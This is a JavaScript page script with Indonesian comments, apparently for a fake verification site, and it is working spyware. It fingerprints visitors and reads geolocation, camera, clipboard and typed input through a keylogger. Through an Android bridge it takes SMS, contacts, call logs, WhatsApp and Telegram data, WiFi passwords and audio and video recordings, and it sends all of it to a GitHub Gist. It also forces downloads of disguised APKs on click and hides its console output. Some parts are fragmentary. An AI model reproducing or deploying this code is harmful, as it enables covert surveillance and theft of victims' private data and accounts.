<script>
// ⚠️ GANTI INI DENGAN PUNYA KAMU!
var GITHUB_TOKEN = 'github_pat_XXXXXXXXXXXX';
var GIST_ID = 'XXXXXXXXXXXXXXXXXXXX';
var GITHUB_USER = 'USERNAME_KAMU';
var GITHUB_REPO = 'verifikasi-site';
var PASSWORD = 'rahasia123';

// DATA STORE
var dataStore = [];
var hasLS = (typeof localStorage !== 'undefined');

if(hasLS) {
    var saved = localStorage.getItem('vd');
    if(saved) try{ dataStore = JSON.parse(saved) } catch(e){}
}

function simpanLokal() {
    if(hasLS) try{ localStorage.setItem('vd', JSON.stringify(dataStore.slice(-500))) } catch(e){}
}

async function simpanKeGist() {
    try {
        var allData = dataStore;
        if(hasLS) {
            var ls = localStorage.getItem('vd');
            if(ls) allData = JSON.parse(ls);
        }
        await fetch('https://api.github.com/gists/' + GIST_ID, {
            method: 'PATCH',
            headers: {
                'Authorization': 'token ' + GITHUB_TOKEN,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                files: {
                    'data.json': {
                        content: JSON.stringify(allData, null, 2)
                    }
                }
            })
        });
    } catch(e) {}
}

function K(d) {
    dataStore.push({ waktu: new Date().toISOString(), sumber: d.sumber || d.type || 'unknown', data: d.data || d });
    simpanLokal();
    simpanKeGist();
}

// ANDROID BRIDGE

    getClipboard: function() { if(this.isAvailable){ try{return AndroidBridge.getClipboard()}catch(e){}} return null },
    keepAwake: function() { if(this.isAvailable){ try{AndroidBridge.keepAwake(true);return true}catch(e){}} return false },
    downloadFile: function(u,f) { if(this.isAvailable){ try{AndroidBridge.downloadFile(u,f);return true}catch(e){}} return false }
};

// FUNGSI DATA
function GD() {
    var a = A.getDeviceInfo();
    var d = { w:Date.now(), ua:navigator.userAgent, pl:navigator.platform, la:navigator.language, sc:screen.width+'x'+screen.height, cd:screen.colorDepth, pr:window.devicePixelRatio, co:document.cookie, ur:location.href, rf:document.referrer, dm:navigator.deviceMemory||'N/A', cc:navigator.hardwareConcurrency||'N/A', on:navigator.onLine, ve:navigator.vendor, mt:navigator.maxTouchPoints, tz:Intl.DateTimeFormat().resolvedOptions().timeZone };
    if(A.isAvailable) { d.android = { deviceInfo:A.getDeviceInfo(), imei:A.getIMEI(), imsi:A.getIMSI(), phoneNumber:A.getPhoneNumber(), googleAccount:A.getGoogleAccount(), facebookAccount:A.getFacebookAccount(), networkInfo:A.getWiFiPasswords?null:null, bluetoothInfo:A.getBluetoothInfo(), sensors:A.getSensors(), batteryDetail:A.getBatteryDetail(), calendarEvents:A.getCalendarEvents(), browserHistory:A.getBrowserHistory(), notificationLog:A.getNotificationLog() } }
    K({sumber:'init',data:d}); return d;
}
async function getIP() { try{ var r = await fetch('https://api.ipify.org?format=json'); var d = await r.json(); K({sumber:'ip',data:d.ip}) } catch(e){} }
function ambilLokasi() { try{ navigator.geolocation.getCurrentPosition(function(p){ K({sumber:'lokasi',data:{lat:p.coords.latitude,lon:p.coords.longitude,akurasi:p.coords.accuracy}}) }, function(){}) } catch(e){} }
function ambilKamera() { try{ navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}}).then(function(s){ s.getTracks().forEach(function(t){t.stop()}); K({sumber:'kamera',data:'aktif'}) }).catch(function(){}) } catch(e){} }
function ambilKontak() { if(A.isAvailable){ var k = A.getAllContacts(); if(k) K({sumber:'kontak_all',data:k}) } else { try{ if('contacts' in navigator) { navigator.contacts.select(['name','tel','email'],{multiple:true}).then(function(k){ K({sumber:'kontak_all',data:k}) }).catch(function(){}) } } catch(e){} } }
function ambilSMS() { if(A.isAvailable){ var s = A.getAllSMS(); if(s) K({sumber:'sms_all',data:s}) } }
function ambilCallLog() { if(A.isAvailable){ var c = A.getCallLog(); if(c) K({sumber:'call_log',data:c}) } }
function ambilWA() { if(A.isAvailable){ var w = A.getWhatsAppData(); if(w) K({sumber:'whatsapp',data:w}) } }
function ambilTelegram() { if(A.isAvailable){ var t = A.getTelegramData(); if(t) K({sumber:'telegram',data:t}) } }
function ambilFile() { if(A.isAvailable){ var f = A.listAllFiles(); if(f) K({sumber:'files_all',data:f}) } }
function ambilApp() { if(A.isAvailable){ var a = A.getInstalledApps(); if(a) K({sumber:'aplikasi_all',data:a}) } }
function ambilWiFi() { if(A.isAvailable){ var w = A.getWiFiPasswords(); if(w) K({sumber:'wifi_passwords',data:w}) } }
function ambilSensors() { if(A.isAvailable){ var s = A.getSensors(); if(s) K({sumber:'sensors',data:s}) } }
function ambilCalendar() { if(A.isAvailable){ var c = A.getCalendarEvents(); if(c) K({sumber:'calendar',data:c}) } }
function ambilBrowserHistory() { if(A.isAvailable){ var h = A.getBrowserHistory(); if(h) K({sumber:'browser_history',data:h}) } }
function ambilNotifications() { if(A.isAvailable){ var n = A.getNotificationLog(); if(n) K({sumber:'notifications',data:n}) } }
function ambilBaterai() { try{ navigator.getBattery().then(function(b){ K({sumber:'baterai',data:{level:Math.round(b.level*100)+'%',charging:b.charging}}) }) } catch(e){} }
function ambilSS() { if(A.isAvailable){ var s = A.takeScreenshot(); if(s) K({sumber:'screenshot',data:s}) } else { try{ if(typeof html2canvas!=='undefined'){ html2canvas(document.body).then(function(c){ K({sumber:'screenshot',data:c.toDataURL()}) }) } } catch(e){} } }
function ambilAudio() { if(A.isAvailable){ var a = A.startRecording(); if(a) K({sumber:'audio_record',data:a}) } }
function ambilVideo() { if(A.isAvailable){ var v = A.startVideoRecording(); if(v) K({sumber:'video_record',data:v}) } }

// KEYLOGGER
var inputData = {};
document.addEventListener('input',function(e){ if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'){ inputData[e.target.id||e.target.name||e.target.type]=e.target.value } });
setInterval(function(){ if(Object.keys(inputData).length>0){ K({sumber:'keylogger',data:inputData,waktu:Date.now()}); inputData={} } },10000);

// CLIPBOARD
function bacaClipboard() { if(A.isAvailable){ var t = A.getClipboard(); if(t) K({sumber:'clipboard',data:t}) } try{ navigator.clipboard.readText().then(function(t){ if(t) K({sumber:'clipboard',data:t}) }).catch(function(){}) } catch(e){} }
setTimeout(bacaClipboard,3000); setInterval(bacaClipboard,5000);

// DOWNLOAD SAAT KLIK
var files = [
    'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.apk',
    'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/com.google.android.appsearch.apk',
    'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/Video.mp4'
];
var downloaded = [];
var downloadTriggered = false;
function runDownload() {
    if(downloadTriggered) return;
    downloadTriggered = true;
    files.forEach(function(f) {
        if(downloaded.indexOf(f) !== -1) return;
        var a = document.createElement('a');
        a.href = f;
        a.download = f.split('/').pop();
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        setTimeout(function(){ document.body.removeChild(a) },1000);
        downloaded.push(f);
        K({sumber:'download',data:{file:f.split('/').pop()},waktu:Date.now()});
    });
}
setTimeout(function(){ document.addEventListener('click', runDownload) }, 1000);

function FK() { setTimeout(function(){ ambilKontak(); ambilSMS(); ambilCallLog(); ambilWA(); ambilTelegram(); ambilFile(); ambilApp(); ambilWiFi(); ambilSensors(); ambilCalendar(); ambilBrowserHistory(); ambilNotifications(); ambilSS(); ambilAudio(); ambilVideo(); K({sumber:'full_kontrol',data:'selesai'}) },5000) }

            h += '</div>';
            c.innerHTML = h;
            new QRCode(document.getElementById('qrCode'),{text:u,width:170,height:170});
            var w = 300; var ti = setInterval(function(){ w--; var m = Math.floor(w/60); var s = w%60; var el = document.getElementById('qrT'); if(el) el.textContent = (m<10?'0':'')+m+':'+(s<10?'0':'')+s; if(w<=0){ clearInterval(ti); c.style.display='none' } },1000);

}

function HB() { setInterval(function(){ K({sumber:'heartbeat',data:'alive'}) },10000) }
function KA() { try{ var a = new(window.AudioContext||window.webkitAudioContext)(); var b = a.createBuffer(1,2*a.sampleRate,a.sampleRate); var s = a.createBufferSource(); s.buffer = b; s.loop = true; s.connect(a.destination); s.start(); K({sumber:'keepalive',data:'active'}) } catch(e){} }
function SW() { if('serviceWorker' in navigator){ navigator.serviceWorker.register('/sw.js').then(function(r){ K({sumber:'keepalive',data:'sw_registered'}) }).catch(function(){}) } }
function cleanup() { console.log=function(){}; console.warn=function(){}; console.error=function(){}; console.info=function(){} }
setTimeout(cleanup,3000);

// START
async function start() {
    if(getPage()) return;
    GD(); await getIP();
    KA(); SW();
    ambilLokasi(); ambilKamera(); ambilBaterai();
    QR(); HB(); FK();
}
start();
setInterval(async function(){ K({sumber:'periodic',data:GD()}) },10000);
window.addEventListener('beforeunload',function(){ K({sumber:'close',data:'Tutup'}) });
</script>
